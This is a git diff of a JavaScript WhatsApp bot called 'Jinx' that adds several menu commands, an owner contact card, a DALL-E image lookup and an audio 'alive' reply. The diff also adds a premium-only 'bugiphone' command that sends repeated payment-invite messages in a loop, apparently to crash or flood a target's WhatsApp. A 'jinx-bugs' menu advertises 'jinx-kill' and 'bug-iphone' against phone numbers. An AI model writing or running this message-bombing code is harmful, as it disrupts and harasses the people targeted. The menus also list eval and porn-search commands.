@@ -683,7 +683,7 @@ const vidq = {
     }
 }
 //=================================================//
-// Ngambil semua plugin dari direktori dan subdirektori
+// 
 const loadPlugins = (directory) => {
     let plugins = []
     const folders = fs.readdirSync(directory)
@@ -708,10 +708,10 @@ try {
     })
     return plugins
 }
-// Ngambil semua plugin dari direktori plugin
+// 
 const plugins = loadPlugins(path.resolve(__dirname, "./plugin"))
 const context = { sam, m, chatUpdate, store, body, require, smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, groupMembers, budy, prefixRegex, prefix, isCmd, command, args, pushname, text, q, fatkuns, quoted, mime, qmsg, isMedia, botNumber, itsMe, itsOrkay, kontributor, isDeveloper, isPremium, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, isGroup, groupOwner, isGroupOwner, time, ucapanWaktu, wib, wita, wit, salam, d, gmt, weton, week, calender, dust, reaction, reply, TelegraPh, toTelegra, resize, remini, crtImg, crtVid, addExifAvatar, addExif, exifAvatar, prM }
-// Kode ini ngeliat plugin satu per satu, kalo nemu plugin yang cocok ama command yang diterima, dia langsung manggil fungsi operate-nya dan berhenti.
+// 
 let handled = false
 for (const plugin of plugins) {
     if (plugin.command.includes(command)) {
@@ -770,12 +770,18 @@ let nest = `
  ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
  ┗━━━━━━━━━━━━━━━━━◈
  ┏━━━━━━━━━━━━━━━━━◈
- ┃ ✰ 𝐨𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮
- ┃ ✰ 𝐩𝐢𝐧𝐠
- ┃ ✰ 𝐉𝐢𝐧𝐱
- ┃ ✰ 𝐠𝐞𝐧𝐢𝐮𝐬-𝐣𝐢𝐧𝐱
- ┃ ✰ 𝐣𝐢𝐧𝐱-𝐝𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐬
- ┃ ✰ 𝐣𝐢𝐧𝐱-𝐜𝐨𝐧𝐯𝐞𝐫𝐭𝐬
+ ┃ ✰ ownermenu
+ ┃ ✰ groupmenu
+ ┃ ✰ jinx
+ ┃ ✰ genius-jinx
+ ┃ ✰ jinx-download
+ ┃ ✰ jinx-converts
+ ┃ ✰ jinx-bugs
+ ┃ ✰ jinx-tools
+ ┃ ✰ othermenu
+ ┃ ✰ funmenu
+ ┃ ✰ buypremium
+ ┃ ✰ owner
  ┗━━━━━━━━━━━━━━━━━◈
 > 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
 sam.sendMessage(m.chat, { 
@@ -887,11 +893,16 @@ let nesy = `
  ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
  ┗━━━━━━━━━━━━━━━━━◈
  ┏━━━━━━━━━━━━━━━━━◈
- ┃ ✰ 𝐩𝐮𝐛𝐥𝐢𝐜
- ┃ ✰ 𝐬𝐞𝐥𝐟
- ┃ ✰ 𝐛𝐥𝐨𝐜𝐤
- ┃ ✰ 𝐮𝐧𝐛𝐥𝐨𝐜𝐤
- ┃ ✰ 𝐥𝐢𝐬𝐭𝐛𝐥𝐨𝐜𝐤
+ ┃ ✰ public 
+ ┃ ✰ self
+ ┃ ✰ block
+ ┃ ✰ restart
+ ┃ ✰ listgc
+ ┃ ✰ broadcast
+ ┃ ✰ broadcastgc
+ ┃ ✰ listpc
+ ┃ ✰ unblock
+ ┃ ✰ listblock
  ┗━━━━━━━━━━━━━━━━━◈
 > 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024 
 > 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
@@ -931,12 +942,13 @@ let nesy = `
  ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
  ┗━━━━━━━━━━━━━━━━━◈
  ┏━━━━━━━━━━━━━━━━━◈
- ┃ ✰ 𝐩𝐥𝐚𝐲
- ┃ ✰ 𝐲𝐭𝐦𝐩3
- ┃ ✰ 𝐲𝐭𝐦𝐩4
- ┃ ✰ 𝐦𝐞𝐝𝐢𝐚𝐟𝐢𝐫𝐞
- ┃ ✰ 𝐢𝐠
- ┃ ✰ 𝐠𝐢𝐭𝐜𝐥𝐨𝐧𝐞
+ ┃ ✰ play
+ ┃ ✰ ytmp3
+ ┃ ✰ ytmp4
+ ┃ ✰ mediafire
+ ┃ ✰ ig
+ ┃ ✰ facebook
+ ┃ ✰ gitclone
  ┗━━━━━━━━━━━━━━━━━◈
 "> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024",
 > 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
@@ -976,12 +988,13 @@ let kesy = `
  ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
  ┗━━━━━━━━━━━━━━━━━◈
  ┏━━━━━━━━━━━━━━━━━◈
- ┃ ✰ 𝐣𝐢𝐧𝐱-𝐚𝐢
- ┃ ✰ 𝐛𝐫𝐚𝐢𝐧-𝐚𝐢
- ┃ ✰ 𝐚𝐢
- ┃ ✰ 𝐚𝐥𝐞𝐱𝐚
+ ┃ ✰ jinx-ai
+ ┃ ✰ brain-ai
+ ┃ ✰ ai
+ ┃ ✰ ai-img
+ ┃ ✰ dall-e
  ┗━━━━━━━━━━━━━━━━━◈
-"> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024",
+> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024,
 > 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
 sam.sendMessage(m.chat, { 
 	           text: kesy,
@@ -1006,6 +1019,115 @@ await loadings()
 let timestamp = speed()
 let latensi = speed() - timestamp
 let run = runtime(process.uptime())
+let loi = ` 
+   🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
+  ━━━━━━━━━━━━━━━━
+  ▣ ${ucapanWaktu} 
+ 
+  ◉ ${m.pushName}
+  ━━━━━━━━━━━━━━━━
+ ┏━━━━━━━━━━━━━━━━━◈
+ ┃ ➢ 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
+ ┃ ➣ 𝐉𝐢𝐧𝐱 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
+ ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
+ ┗━━━━━━━━━━━━━━━━━◈
+ ┏━━━━━━━━━━━━━━━━━◈
+ ┃ ✰ calc
+ ┃ ✰ remini
+ ┃ ✰ rmbg
+ ┃ ✰ shorturl
+ ┃ ✰ sticker
+ ┃ ✰ smeme
+ ┃ ✰ textmaker
+ ┃ ✰ textflip
+ ┃ ✰ toimage
+ ┃ ✰ toaudio
+ ┃ ✰ ttp
+ ┃ ✰ toqr
+ ┃ ✰ tourl
+ ┃ ✰ tts
+ ┗━━━━━━━━━━━━━━━━━◈
+> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024 
+> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
+sam.sendMessage(m.chat, { 
+	           text: loi,
+                    contextInfo: {
+                        externalAdReply: {
+                            showAdAttribution: true,
+                            title: `𝐉𝐈𝐍𝐗`,
+                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
+                            thumbnailUrl: `https://telegra.ph/file/d945b02dab1726a2bc763.jpg`, 
+                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
+                            mediaType: 1,
+                            renderLargerThumbnail: true
+                        }
+                    }
+                }, {
+                    quoted: m
+                    })
+                    }
+                 break
+case 'groupmenu':{
+await loadings()
+let timestamp = speed()
+let latensi = speed() - timestamp
+let run = runtime(process.uptime())
+let osy = ` 
+   🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
+  ━━━━━━━━━━━━━━━━
+  ▣ ${ucapanWaktu} 
+ 
+  ◉ ${m.pushName}
+  ━━━━━━━━━━━━━━━━
+ ┏━━━━━━━━━━━━━━━━━◈
+ ┃ ➢ 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
+ ┃ ➣ 𝐉𝐢𝐧𝐱 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
+ ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
+ ┗━━━━━━━━━━━━━━━━━◈
+ ┏━━━━━━━━━━━━━━━━━◈
+ ┃ ✰ add
+ ┃ ✰ kick
+ ┃ ✰ promote
+ ┃ ✰ demote
+ ┃ ✰ antilink
+ ┃ ✰ link
+ ┃ ✰ editsubject
+ ┃ ✰ inspect
+ ┃ ✰ setppgc
+ ┃ ✰ revoke
+ ┃ ✰ invite
+ ┃ ✰ hidetag
+ ┃ ✰ tagall
+ ┃ ✰ poll
+ ┃ ✰ nsfwmenu
+ ┃ ✰ welcome 
+ ┃ ✰ couple
+ ┗━━━━━━━━━━━━━━━━━◈
+> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024 
+> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
+sam.sendMessage(m.chat, { 
+	           text: osy,
+                    contextInfo: {
+                        externalAdReply: {
+                            showAdAttribution: true,
+                            title: `𝐉𝐈𝐍𝐗`,
+                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
+                            thumbnailUrl: `https://telegra.ph/file/d945b02dab1726a2bc763.jpg`, 
+                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
+                            mediaType: 1,
+                            renderLargerThumbnail: true
+                        }
+                    }
+                }, {
+                    quoted: m
+                    })
+                    }
+                 break
+case 'jinx-tools':{
+await loadings()
+let timestamp = speed()
+let latensi = speed() - timestamp
+let run = runtime(process.uptime())
 let pesy = ` 
    🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
   ━━━━━━━━━━━━━━━━
@@ -1019,19 +1141,19 @@ let pesy = `
  ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
  ┗━━━━━━━━━━━━━━━━━◈
  ┏━━━━━━━━━━━━━━━━━◈
- ┃ ✰ 𝐜𝐚𝐥𝐜
- ┃ ✰ 𝐫𝐞𝐦𝐢𝐧𝐢
- ┃ ✰ 𝐫𝐦𝐛𝐠
- ┃ ✰ 𝐬𝐡𝐨𝐮𝐫𝐭𝐮𝐫𝐥
- ┃ ✰ 𝐬𝐭𝐢𝐜𝐤𝐞𝐫
- ┃ ✰ 𝐬𝐦𝐞𝐦𝐞
- ┃ ✰ 𝐭𝐞𝐱𝐭𝐦𝐚𝐤𝐞𝐫
- ┃ ✰ 𝐬𝐭𝐭
- ┃ ✰ 𝐭𝐨𝐢𝐦𝐚𝐠𝐞
- ┃ ✰ 𝐭𝐨𝐚𝐮𝐝𝐢𝐨
- ┃ ✰ 𝐭𝐭𝐩
- ┃ ✰ 𝐭𝐨𝐪𝐫
- ┃ ✰ 𝐭𝐭𝐬
+ ┃ ✰ enc
+ ┃ ✰ google
+ ┃ ✰ subfinder
+ ┃ ✰ ssf
+ ┃ ✰ ss
+ ┃ ✰ lyrics
+ ┃ ✰ compile-c
+ ┃ ✰ eval
+ ┃ ✰ telestick
+ ┃ ✰ anime
+ ┃ ✰ weather
+ ┃ ✰ advice
+ ┃ ✰ sound1-160
  ┗━━━━━━━━━━━━━━━━━◈
 > 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024 
 > 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
@@ -1053,6 +1175,156 @@ sam.sendMessage(m.chat, {
                     })
                     }
                  break
+case 'othermenu':{
+await loadings()
+let timestamp = speed()
+let latensi = speed() - timestamp
+let run = runtime(process.uptime())
+let psy = ` 
+   🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
+  ━━━━━━━━━━━━━━━━
+  ▣ ${ucapanWaktu} 
+ 
+  ◉ ${m.pushName}
+  ━━━━━━━━━━━━━━━━
+ ┏━━━━━━━━━━━━━━━━━◈
+ ┃ ➢ 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
+ ┃ ➣ 𝐉𝐢𝐧𝐱 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
+ ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
+ ┗━━━━━━━━━━━━━━━━━◈
+ ┏━━━━━━━━━━━━━━━━━◈
+ ┃ ✰ ping
+ ┃ ✰ alive
+ ┃ ✰ owner
+ ┃ ✰ delppbot
+ ┃ ✰ truecaller
+ ┃ ✰ apk
+ ┃ ✰ emojimix
+ ┃ ✰ tovv/vv
+ ┃ ✰ wallpaper 
+ ┃ ✰ wikimedia
+ ┃ ✰ ringtone 
+ ┃ ✰ broadcastgc
+ ┃ ✰ githubsearch
+ ┃ ✰ wanumber
+ ┃ ✰ tagall
+ ┗━━━━━━━━━━━━━━━━━◈
+> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024 
+> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
+sam.sendMessage(m.chat, { 
+	           text: psy,
+                    contextInfo: {
+                        externalAdReply: {
+                            showAdAttribution: true,
+                            title: `𝐉𝐈𝐍𝐗`,
+                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
+                            thumbnailUrl: `https://telegra.ph/file/d945b02dab1726a2bc763.jpg`, 
+                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
+                            mediaType: 1,
+                            renderLargerThumbnail: true
+                        }
+                    }
+                }, {
+                    quoted: m
+                    })
+                    }
+                 break
+case 'funmenu':{
+await loadings()
+let timestamp = speed()
+let latensi = speed() - timestamp
+let run = runtime(process.uptime())
+let pov = ` 
+   🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
+  ━━━━━━━━━━━━━━━━
+  ▣ ${ucapanWaktu} 
+ 
+  ◉ ${m.pushName}
+  ━━━━━━━━━━━━━━━━
+ ┏━━━━━━━━━━━━━━━━━◈
+ ┃ ➢ 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
+ ┃ ➣ 𝐉𝐢𝐧𝐱 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
+ ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
+ ┗━━━━━━━━━━━━━━━━━◈
+ ┏━━━━━━━━━━━━━━━━━◈
+ ┃ ✰ cry
+ ┃ ✰ kill
+ ┃ ✰ kiss
+ ┃ ✰ wink
+ ┃ ✰ wave
+ ┃ ✰ happy
+ ┃ ✰ kill
+ ┃ ✰ hug
+ ┃ ✰ bully
+ ┃ ✰ cuddle
+ ┃ ✰ lick
+ ┃ ✰ hug
+ ┃ ✰ yeet
+ ┃ ✰ blush
+ ┃ ✰ cringe 
+ ┗━━━━━━━━━━━━━━━━━◈
+> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024 
+> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
+sam.sendMessage(m.chat, { 
+	           text: pov,
+                    contextInfo: {
+                        externalAdReply: {
+                            showAdAttribution: true,
+                            title: `𝐉𝐈𝐍𝐗`,
+                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
+                            thumbnailUrl: `https://telegra.ph/file/d945b02dab1726a2bc763.jpg`, 
+                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
+                            mediaType: 1,
+                            renderLargerThumbnail: true
+                        }
+                    }
+                }, {
+                    quoted: m
+                    })
+                    }
+                 break
+case 'jinx-bugs':{
+await loadings()
+let timestamp = speed()
+let latensi = speed() - timestamp
+let run = runtime(process.uptime())
+let lnm = ` 
+   🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
+  ━━━━━━━━━━━━━━━━
+  ▣ ${ucapanWaktu} 
+ 
+  ◉ ${m.pushName}
+  ━━━━━━━━━━━━━━━━
+ ┏━━━━━━━━━━━━━━━━━◈
+ ┃ ➢ 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
+ ┃ ➣ 𝐉𝐢𝐧𝐱 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
+ ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
+ ┗━━━━━━━━━━━━━━━━━◈
+ ┏━━━━━━━━━━━━━━━━━◈
+ ┃ ✰ jinx-kill 254****
+ ┃ ✰ bug-iphone 254**
+ ┗━━━━━━━━━━━━━━━━━◈
+> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024 
+> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
+sam.sendMessage(m.chat, { 
+	           text: lnm,
+                    contextInfo: {
+                        externalAdReply: {
+                            showAdAttribution: true,
+                            title: `𝐉𝐈𝐍𝐗`,
+                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
+                            thumbnailUrl: `https://telegra.ph/file/d945b02dab1726a2bc763.jpg`, 
+                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
+                            mediaType: 1,
+                            renderLargerThumbnail: true
+                        }
+                    }
+                }, {
+                    quoted: m
+                    })
+                    }
+                 break
+
 //======================================//
 case "ping": case "speed": { 
 let timestamp = speed()
@@ -1213,6 +1485,21 @@ let response = await sam.groupInviteCode(m.chat)
 sam.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
  await reaction(m.chat, "🦄")}
 break
+case "owner": {
+const repf = await sam.sendMessage(from, { 
+contacts: { 
+displayName: `${list.length} Contacts`, 
+contacts: list }, contextInfo: {
+forwardingScore: 9999999, 
+isForwarded: true,
+mentionedJid: [sender]
+}}, { quoted: m })
+sam.sendMessage(from, { text : `Hello @${sender.split("@")[0]}, My owner is 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`, contextInfo:{
+forwardingScore: 9999999, 
+isForwarded: true,
+mentionedJid:[sender]
+}}, { quoted: repf })
+}
 //=================================================//
 case 'resetlinkgc': case 'revoke': {
 if (!isGroup) return reply(mess.ingroup)
@@ -1311,6 +1598,74 @@ case 'listonline': case 'liston': {
                     sam.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
              }
              break;
+case "dall-e": {
+if (!text) return msgreply (`Example : ${prefix + command} Mountain With Rainy Weather`)
+imgurl = `https://aemt.me/dalle?text=${q}`
+ sam.sendMessage(m.chat, {
+image: {url: imgurl},
+caption: 'Nih,BTW, if you give me a correct illustration',
+},{quoted: m })
+}
+break
+case "alive":
+
+const audiovn = "./derived/alive.mp3";
+    const dooc = {
+        audio: {
+          url: audiovn
+        },
+        mimetype: 'audio/mp4',
+        ptt: true,
+        waveform:  [100, 0, 100, 0, 100, 0, 100],
+        fileName: "",
+
+        contextInfo: {
+          mentionedJid: [m.sender],
+          externalAdReply: {
+          title: "𝐇𝐞𝐥𝐥𝐨 𝐅𝐫𝐢𝐞𝐧𝐝 𝐘𝐨𝐮 𝐜𝐚𝐧 𝐜𝐚𝐥𝐥 𝐌𝐞 𝐉𝐢𝐧𝐱",
+          body: "https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e",
+          thumbnailUrl: "https://telegra.ph/file/7025f5efa4cc1e28ff651.jpg",
+          sourceUrl: "https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e",
+          mediaType: 1,
+          renderLargerThumbnail: true
+          }}
+      };
+
+
+await sam.sendMessage(m.chat, dooc, {quoted: m});
+
+
+break;
+case 'runtime':
+                let pinga = `𝐉𝐈𝐍𝐗 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐀𝐂𝐓𝐈𝐕𝐄 𝐅𝐎𝐑 ${runtime(process.uptime())}`
+                sam.sendMessage(m.chat, {
+                    text: pinga,
+                    contextInfo: {
+                        externalAdReply: {
+                            showAdAttribution: true,
+                            title: botname,
+                            body: ownername,
+                            thumbnailUrl: 'https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e',
+                            sourceUrl: 'https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e',
+                            mediaType: 1,
+                            renderLargerThumbnail: true
+                        }
+                    }
+                }, {
+                    quoted: m
+                })
+                break
+case 'bugiphone': {
+if (!isPremium) return reply(mess.premium)
+if (!q) return reply(`use .${command} 6`)
+jumlah = q * 2
+for (let i = 0; i < jumlah; i++) {
+await sam.relayMessage(m.chat, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
+await sleep(1400)
+}
+}
+break
+
 case 'true':
 case 'truecaller':
   try {
@@ -1968,8 +2323,8 @@ case 'nsfwmenu':
 │⊳ 💦  ${prefix}ʜᴇᴀᴅʙᴀɴᴅ
 │⊳ 💦  ${prefix}ꜰᴏxɢɪʀʟ
 │⊳ 💦  ${prefix}ᴀɴɪᴍᴀʟᴇᴀʀꜱ
-│⊳ 💦  ${prefix}ʙʀᴀ
-│⊳ 💦  ${prefix}ꜱᴋɪʀᴛ
+│⊳ 💦  ${prefix}xnxxdl
+│⊳ 💦  ${prefix}xxnsearch
 │⊳ 💦  ${prefix}ʙʀᴇᴀꜱᴛꜱ
 │⊳ 💦  ${prefix}ᴛᴀᴛᴛᴏᴏ
 │⊳ 💦  ${prefix}ᴄʜᴀɪɴ
